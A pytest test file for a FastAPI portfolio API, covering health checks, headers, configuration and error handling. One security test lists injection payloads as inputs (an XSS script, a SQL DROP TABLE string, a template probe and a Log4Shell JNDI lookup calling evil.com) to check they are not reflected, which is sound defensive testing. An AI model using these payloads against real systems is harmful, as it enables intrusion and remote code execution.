"""Comprehensive unit tests for main FastAPI application."""
import pytest
from fastapi.testclient import TestClient
from unittest.mock import patch, Mock
import json
import time

from main import app


class TestMainApplication:
    """Test suite for main FastAPI application."""

    def test_app_startup(self, client):
        """Test application starts up correctly."""
        response = client.get("/health")
        assert response.status_code == 200
        assert response.json()["status"] == "healthy"

    def test_root_endpoint(self, client):
        """Test root endpoint returns correct response."""
        response = client.get("/")
        assert response.status_code == 200
        data = response.json()
        assert "message" in data
        assert "version" in data
        assert data["version"] == "1.0.0"

    def test_api_docs_accessible(self, client):
        """Test API documentation is accessible."""
        response = client.get("/docs")
        assert response.status_code == 200
        assert "text/html" in response.headers["content-type"]

    def test_openapi_schema(self, client):
        """Test OpenAPI schema is valid."""
        response = client.get("/openapi.json")
        assert response.status_code == 200
        schema = response.json()
        assert "openapi" in schema
        assert "info" in schema
        assert schema["info"]["title"] == "DevPortfolio API"

    def test_cors_headers(self, client):
        """Test CORS headers are set correctly."""
        response = client.options("/", headers={
            "Origin": "http://localhost:3000",
            "Access-Control-Request-Method": "GET"
        })
        assert response.status_code == 200
        assert "access-control-allow-origin" in response.headers

    @pytest.mark.performance
    def test_response_time_performance(self, client, performance_threshold):
        """Test API response times meet performance requirements."""
        start_time = time.time()
        response = client.get("/health")
        end_time = time.time()
        
        response_time = end_time - start_time
        assert response.status_code == 200
        assert response_time < performance_threshold["api_response_time"]

    def test_error_handling_404(self, client):
        """Test 404 error handling."""
        response = client.get("/nonexistent-endpoint")
        assert response.status_code == 404
        data = response.json()
        assert "detail" in data

    def test_error_handling_method_not_allowed(self, client):
        """Test method not allowed error handling."""
        response = client.post("/health")
        assert response.status_code == 405

    @patch('services.external_integration_service.ExternalIntegrationService')
    def test_external_service_integration(self, mock_service, client):
        """Test external service integration is properly configured."""
        mock_instance = Mock()
        mock_service.return_value = mock_instance
        
        # Test that external services are initialized
        response = client.get("/health")
        assert response.status_code == 200

    def test_security_headers(self, client):
        """Test security headers are present."""
        response = client.get("/")
        assert response.status_code == 200
        
        # Check for security headers
        headers = response.headers
        expected_headers = [
            "x-content-type-options",
            "x-frame-options",
            "x-xss-protection"
        ]
        
        for header in expected_headers:
            assert header in headers.keys() or header.replace("-", "_") in headers.keys()

    def test_content_type_json(self, client):
        """Test JSON content type is set correctly."""
        response = client.get("/")
        assert response.status_code == 200
        assert "application/json" in response.headers["content-type"]

    def test_rate_limiting_configuration(self, client):
        """Test rate limiting is configured (basic test)."""
        # Make multiple requests to test rate limiting
        responses = []
        for _ in range(10):
            response = client.get("/health")
            responses.append(response.status_code)
        
        # Should not be rate limited for health endpoint
        assert all(status == 200 for status in responses)

    @pytest.mark.integration
    def test_database_connection_health(self, client, db_session):
        """Test database connection health check."""
        response = client.get("/health/db")
        # This endpoint should be implemented in main.py
        # For now, test that it doesn't crash the app
        assert response.status_code in [200, 404]

    def test_environment_configuration(self):
        """Test environment configuration is loaded correctly."""
        from main import app
        # Test that app is configured with correct settings
        assert app.title == "DevPortfolio API"
        assert app.version == "1.0.0"

    @pytest.mark.security
    def test_input_validation_security(self, client):
        """Test input validation prevents basic injection attacks."""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for malicious_input in malicious_inputs:
            response = client.get(f"/?q={malicious_input}")
            # Should not crash and should sanitize input
            assert response.status_code in [200, 400, 422]
            if response.status_code == 200:
                # Ensure malicious content is not reflected
                assert malicious_input not in response.text

    def test_api_versioning(self, client):
        """Test API versioning is implemented."""
        response = client.get("/v1/")
        # Should either work or return 404 (if not implemented yet)
        assert response.status_code in [200, 404]

    @pytest.mark.slow
    def test_concurrent_requests(self, client):
        """Test application handles concurrent requests."""
        import concurrent.futures
        import threading
        
        def make_request():
            return client.get("/health")
        
        # Test concurrent requests
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(make_request) for _ in range(10)]
            results = [future.result() for future in concurrent.futures.as_completed(futures)]
        
        # All requests should succeed
        assert all(r.status_code == 200 for r in results)

    def test_middleware_configuration(self, client):
        """Test middleware is configured correctly."""
        response = client.get("/")
        assert response.status_code == 200
        
        # Test that middleware doesn't break functionality
        assert "content-length" in response.headers
        assert "date" in response.headers


class TestHealthChecks:
    """Test suite for health check endpoints."""

    def test_basic_health_check(self, client):
        """Test basic health check endpoint."""
        response = client.get("/health")
        assert response.status_code == 200
        data = response.json()
        assert data["status"] == "healthy"
        assert "timestamp" in data
        assert "uptime" in data

    def test_detailed_health_check(self, client):
        """Test detailed health check with service status."""
        response = client.get("/health/detailed")
        # This endpoint should be implemented
        if response.status_code == 200:
            data = response.json()
            assert "services" in data
            assert "database" in data["services"]
            assert "redis" in data["services"]
            assert "external_apis" in data["services"]

    @pytest.mark.integration
    def test_health_check_with_dependencies(self, client, db_session, mock_redis):
        """Test health check includes dependency status."""
        with patch('main.redis_client', mock_redis):
            response = client.get("/health")
            assert response.status_code == 200


class TestErrorHandling:
    """Test suite for error handling."""

    def test_validation_error_handling(self, client):
        """Test validation error responses."""
        response = client.post("/api/blog/", json={
            "title": "",  # Invalid empty title
            "content": "test content"
        })
        assert response.status_code == 422
        data = response.json()
        assert "detail" in data

    def test_server_error_handling(self, client):
        """Test server error handling."""
        with patch('main.app') as mock_app:
            mock_app.side_effect = Exception("Test server error")
            # This would require a specific endpoint that can trigger errors
            # For now, just ensure the test framework is working
            assert True

    def test_custom_exception_handling(self, client):
        """Test custom exception handling."""
        # Test custom exceptions are handled properly
        response = client.get("/test-custom-error")
        # Should return 404 if endpoint doesn't exist
        assert response.status_code == 404


class TestConfiguration:
    """Test suite for application configuration."""

    def test_debug_mode_disabled_in_production(self):
        """Test debug mode is disabled in production."""
        import os
        env = os.environ.get("ENVIRONMENT", "development")
        if env == "production":
            from main import app
            # FastAPI doesn't have a direct debug attribute, but we can check behavior
            assert app.debug is False

    def test_secret_key_configuration(self):
        """Test secret key is configured."""
        import os
        secret_key = os.environ.get("SECRET_KEY")
        assert secret_key is not None
        assert len(secret_key) >= 32  # Minimum length for security

    def test_database_url_configuration(self):
        """Test database URL is configured."""
        import os
        database_url = os.environ.get("DATABASE_URL")
        assert database_url is not None
        assert database_url.startswith(("postgresql://", "sqlite://", "mysql://"))

    def test_redis_configuration(self):
        """Test Redis configuration."""
        import os
        redis_url = os.environ.get("REDIS_URL")
        assert redis_url is not None
        assert redis_url.startswith("redis://")

    def test_external_api_configuration(self):
        """Test external API configurations."""
        import os
        openai_key = os.environ.get("OPENAI_API_KEY")
        github_token = os.environ.get("GITHUB_TOKEN")
        
        assert openai_key is not None
        assert github_token is not None
        
        # Keys should not be exposed in responses
        client = TestClient(app)
        response = client.get("/")
        assert openai_key not in response.text
        assert github_token not in response.text